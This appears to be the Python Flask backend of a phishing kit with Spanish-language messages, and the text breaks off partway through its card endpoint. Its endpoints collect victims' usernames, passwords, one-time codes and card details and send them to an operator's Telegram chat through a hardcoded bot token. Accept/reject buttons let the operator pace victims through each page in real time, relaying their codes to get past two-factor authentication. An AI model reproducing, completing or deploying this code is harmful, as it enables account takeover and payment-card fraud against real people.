from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from datetime import datetime
import threading
import time

BOT_TOKEN = '8144392743:AAF0qG5TnvlhYcGZdlz7f3rwLpMBw3rXvqQ'
ADMIN_CHAT_ID = '6434195233'
PORT = 3000

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# Store user data
user_data = {}
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
last_update_id = 0

# ============ API ENDPOINTS ============

@app.route('/api/submit-login', methods=['POST', 'OPTIONS'])
def submit_login():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    user_id = data.get('userId')
    username = data.get('username')
    password = data.get('password')
    
    print(f"[{datetime.now()}] 📥 Login: {user_id} - {username}")
    
    user_data[user_id] = {
        'username': username,
        'password': password,
        'login_status': 'pending',
        'otp_status': 'pending',
        'card_status': 'pending',
        'timestamp': datetime.now().isoformat()
    }
    
    # Create inline keyboard with ACCEPT and REJECT buttons
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ ACEPTAR LOGIN", "callback_data": f"accept_login_{user_id}"},
                {"text": "❌ RECHAZAR LOGIN", "callback_data": f"reject_login_{user_id}"}
            ]
        ]
    }
    
    message = (f"🔐 **NUEVO LOGIN** 🔐\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"🆔 ID: `{user_id}`\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"👤 Usuario: {username}\n"
               f"🔑 Contraseña: {password}\n\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n"
               f"⏰ Hora: {datetime.now().strftime('%H:%M:%S')}\n"
               f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
               f"⚠️ **ACEPTAR** = Usuario ve OTP page\n"
               f"❌ **RECHAZAR** = Usuario ve mensaje de error")
    
    requests.post(f"{TELEGRAM_API}/sendMessage",
        json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown", "reply_markup": keyboard})
    
    return jsonify({"success": True})

@app.route('/api/submit-otp', methods=['POST', 'OPTIONS'])
def submit_otp():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    user_id = data.get('userId')
    user_otp = data.get('otp')
    
    print(f"[{datetime.now()}] 🔢 OTP submitted: {user_id} - {user_otp}")
    
    if user_id in user_data:
        user_data[user_id]['otp'] = user_otp
        
        # Create inline keyboard with ACCEPT and REJECT buttons for OTP
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "✅ ACEPTAR OTP", "callback_data": f"accept_otp_{user_id}"},
                    {"text": "❌ RECHAZAR OTP", "callback_data": f"reject_otp_{user_id}"}
                ]
            ]
        }
        
        message = (f"🔢 **CÓDIGO OTP RECIBIDO** 🔢\n\n"
                   f"━━━━━━━━━━━━━━━━━━━━━━\n"
                   f"🆔 ID: `{user_id}`\n"
                   f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                   f"👤 Usuario: {user_data[user_id]['username']}\n"
                   f"🔢 Código OTP: `{user_otp}`\n\n"
                   f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                   f"⚠️ **ACEPTAR** = Usuario ve CC page\n"
                   f"❌ **RECHAZAR** = Usuario ve error en OTP page")
        
        requests.post(f"{TELEGRAM_API}/sendMessage",
            json={"chat_id": ADMIN_CHAT_ID, "text": message, "parse_mode": "Markdown", "reply_markup": keyboard})
    
    return jsonify({"success": True})

@app.route('/api/card', methods=['POST', 'OPTIONS'])
def submit_card():
    if request.method == 'OPTIONS':
        return jsonify({}), 200
    
    data = request.json
    user_id = data.get('userId')
    
    # Create inline keyboard with ACCEPT and REJECT buttons for card
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "✅ ACEPTAR TARJETA", "callback_data": f"accept_card_{user_id}"},
                {"text": "❌ RECHAZAR TARJETA
